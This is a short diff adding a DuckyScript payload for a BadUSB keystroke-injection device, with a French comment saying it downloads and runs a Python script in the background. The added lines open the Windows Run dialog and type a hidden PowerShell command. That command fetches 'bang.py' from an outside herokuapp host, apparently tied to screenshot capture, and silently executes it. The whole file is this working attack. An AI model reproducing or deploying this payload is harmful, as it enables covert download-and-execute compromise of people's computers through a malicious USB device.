@@ -1,0 +1,6 @@
+REM Téléchargement et exécution directe du script python en arrière-plan
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source 'https://screenshot-badkb-806c08a412f9.herokuapp.com/bang.py' -Destination 'C:\Temp\bang.py'; Start-Process -WindowStyle Hidden -FilePath 'C:\Temp\bang.py'}"
+ENTER
